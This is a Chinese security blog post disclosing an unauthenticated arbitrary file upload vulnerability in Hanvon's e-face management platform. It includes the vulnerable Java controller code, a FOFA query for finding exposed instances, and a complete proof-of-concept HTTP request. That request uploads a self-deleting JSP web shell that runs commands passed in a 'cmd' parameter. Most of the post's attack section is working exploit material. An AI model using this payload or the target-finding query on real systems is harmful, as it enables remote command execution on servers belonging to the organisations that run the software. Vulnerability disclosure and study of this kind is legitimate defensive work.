---
title: "汉王e脸通综合管理平台 meetingPersonal/uploadMeetingFile.do 任意文件上传漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-meetingPersonal-uploadMeetingFile-upload-rce.html
asset_dir: assets/汉王e脸通综合管理平台-meetingpersonaluploadmeetingfile.do-任意文件上传漏洞
---

# 汉王e脸通综合管理平台 meetingPersonal/uploadMeetingFile.do 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/15 08:35
* 784浏览
* [0评论](#comment)
* 31分钟阅读

深入探索

应用程序

安全

SQL


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `meetingPersonal/uploadMeetingFile.do` 接口存在任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)。攻击者可在无需认证的情况下，通过向该接口上传恶意文件，实现任意文件上传，进而可能导致[远程代码执行](https://mrxn.net/tag/rce)或服务器被控制，严重威胁系统安全。

漏洞修复方案

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

看下 `MeetingPersonalController` 的关于 `uploadMeetingFile.do` 的实现

```
@ResponseBody
  @RequestMapping(value = {"uploadMeetingFile.do"}, method = {RequestMethod.POST})
  public RequestJson uploadMeetingFile(HttpServletRequest request, HttpServletResponse response) {
    RequestJson result = new RequestJson();
    try {
      String fileName = null, fileType = null;
      if (!ServletFileUpload.isMultipartContent(request)) {
        result = RequestJson.failuerResult(result, getMessage("system_blacklist_network_error"));
        return result;
      } 
      SessionalUser su = getSessionUser();
      Locale newLocale = TheApp.getLocale(su.getLanguageLocal());
      UserHandlerInterceptor.setLocale(request, response, newLocale);
      MultipartHttpServletRequest multipartRequest = (MultipartHttpServletRequest)request;
      Map<String, MultipartFile> fileMap = multipartRequest.getFileMap();
      String uploadPath = null;
      for (Map.Entry<String, MultipartFile> entity : fileMap.entrySet()) {
        MultipartFile mf = entity.getValue();
        if (!mf.isEmpty()) {
          String fileTypeStr = mf.getOriginalFilename();
          String fileId = UUID.randomUUID().toString().replace("-", "");
          fileName = fileTypeStr.split("\\.")[0];
          fileType = fileTypeStr.split("\\.")[1];
          String path = request.getSession().getServletContext().getRealPath("/resource");
          File tmpFile = new File(path);
          if (!tmpFile.exists())
            tmpFile.mkdir(); 
          uploadPath = path + "/" + fileId + "." + fileType;
          File targetFile = new File(uploadPath);
          logger.error("文件存储地址测试" + uploadPath);
          Files.copy(mf
              .getInputStream(), targetFile
              .toPath(), new CopyOption[] { StandardCopyOption.REPLACE_EXISTING });
          uploadPath = fileId + "." + fileType;
          fileName = fileName + "." + fileType;
        } 
      }
```

直接保存文件到 `resource` 目录，全程无过滤和校验，造成任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)。

# 漏洞复现

```
POST /manage/meetingPersonal/uploadMeetingFile.do?recoToken=67mds2pxXQb&type= HTTP/1.1
Host: hanvon.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj

------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="1.jsp"
Content-Type: image/jpeg

<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
```

访问文件执行命令 `/manage/resource/xxxxx.jsp?cmd=whoami`

[![汉王e脸通综合管理平台 meetingPersonal/uploadMeetingFile.do 任意文件上传漏洞](images/img-001-319fb541773d.webp)](https://image.mrxn.net/0191d8afdcb54470b2b92d8f9cdadaa2.webp)

成功得到 `whoami` [命令执行](https://mrxn.net/tag/rce)结果

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉王e脸通综合管理平台 meetingPersonal/uploadMeetingFile.do 任意文件上传漏洞](https://mrxn.net/jswz/hanvon-efacego-meetingPersonal-uploadMeetingFile-upload-rce.html)  
文章链接：<https://mrxn.net/jswz/hanvon-efacego-meetingPersonal-uploadMeetingFile-upload-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

物流软件安全

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-meetingPersonal-uploadMeetingFile-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

Windows安全工具

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAANgElEQVR4Aeyc4XLjRgyD7+v7v3MbLA7WktqVnbs08Q91goAEQWojyomTm+k/v379+vez+Hf6L72TNMLoX8Fj4OJTZquUuLNqM1KP1vPo4l57lqsniPezrIX8+hjyEj6Glw/gkQO/4ECfGWP05OKVJv0Z0geczt97wWebe+Do6/5V3nvjAc9OPnN6nnF6xkKS3Pzzd6AsBLxpqPyZY+ZJAM9I705XHapX2gxwHcxzTbFmg2tglj5DHgFcVyyAc3nhiJU/g/qFZz7VwbOhsmozykLmwh3/zB3464XoCRGeHR/8ZMi7Q2bs6tHBs+KH/c8CsBfMfUZyzUoM9koToObSBLA+90n/G/z1Qv7m4nfv+Q58+UKgPjW5ZJ6i5GCfcjjiOQfrYFZtBhw6HLE8/XrSngE8o/c+yzNXvsR/yl++kD89yN3nO1AWog2vYOv6M/ipSjX9ycNgH5hn3xzHP3Pq4N7Uos+c2o6hzph9mQP29Hz2fjbOrM59TllIL/5xfjf+8R0YCwE/EXDNq6tk470GntX1+OGog+PU0pMc1vX4gIRbzqwYkgPjLwzSwXGv9VzeFYCTDIz5cM1pHAtJcvPP34F/sv3PcI6tHvDmFQupheF5XX1CenYMntXrV72qCelRLOxy6bC+jmoC1DrUXB5d409wv0J0994IZSFw3rTOCtbhzKqv0J+OlWenpXdXjw6vnweqt89I/gr38yUXg6+TOeAcrjn+sRCwWQOFFMF6ctWE5GLlguIZUHvBOZjjfaV39q780jqgXqfPANfTB+c/v8w1ICMeP6RTfxQugp03OjDmjoVczLlL33wH/gEelwTGlsCcQt9icjFUb3rCUOvqmQHEemJgnCd+qHkawDoQ6fEPVkCZEcNqZmqd4w33+is51HPsZt2vkFfu5jd6ykL61nY5eNtw/r4LrvWvoc+a61B74g3DqM8tJZavCBcJ1FnqFcA68OgGxqsLzI/CCwG4R7OFXQtUX1nIrunWv+8OLBeijQo5BniLYFZNUB2sgVnaCuA6mF/xwN6rfp1BmGNwD5hVF8C5vCvIs9JnDeoMcA4Hx695QvIw2Js8DNaXC4np5u+/A+VPJ/3y4K1F18YFsK44tR3LswIcM3q9z0q966s83vDKs9Lg/POwz3iWz3PBX1+09Ia7nvx+heROvAlf/h6SbYahbv3qa3i1B3iMAca7mvSmAGu914FIDwbGzAiZDdbBLB0cx9sZruua0XuSw7oXqn6/QnLH3oQ/tRA9AcJ8duXCrM2xagLUJ2H2JJZP6Lk0ITrUWaoF8YS7DrU3PvHO23V5BaizAMkDr/Z036cWMq50f/pf78B4l/XqFYDx/bhvde5PDewF8+xRHJ8Y1h75ZkD1wZHDEasHaq7rzJBnYPoE6x5Y62ldzYXaE++OM+N+hezu0A/p410W1G1mWzkTuN511aHWoOa9B1wHs2Z0gGtQufv6bNXBPYoFcA5maUJ6w7OmeIV4wbN6PvekNmtXMXjm+JbVm8HFDEgdrMPBqe28XV/lmQGemzze8E5XvdeSh+WZAb7WM031zAD3JFdNSA7nXy5VF+IJg2epNuP+ljXfjTeIy7esbC+c84G32XXVwTWo3L3gunp26D3xRQfP6DkQ64mB5RuRzJgbugbunT2Koepw5HDE8gZgHcz9WvHdr5DciTfh8TNkdxbwNlMH59muODXFQnKwF8yqzZh9icNQe8B56n/C4BlgfmVGztu9z3TV4fXrzPPvV8h8N94gHgvRRoWcB+p2VZsBtZ4+8eybY6g9UHP1grX0Qc2vdKhecK65MzJj1hJD7QHnYE4vOE/fzOBa9yaPF+xLnvpYSMSbv+wO/PGg5UKyrT4VvNXU4XjfDa71nuRzDxx90qH2gnPVhMwA68nDQMIHq094CC0AxrsvMKssv6D4FcDRG7/6hV0ePQyeAeblQmK++fvvwPg9pF8WvC1tWoB9Dq7tZkQH+zRPAOdQXy2q9R6wN/oVQ/VqnpAe2Neh1tKjfgFcVzwjPnAdDu615HP/HN+vkNyhN+GxEDg2CscTC9ZzVjjn83YVx6tY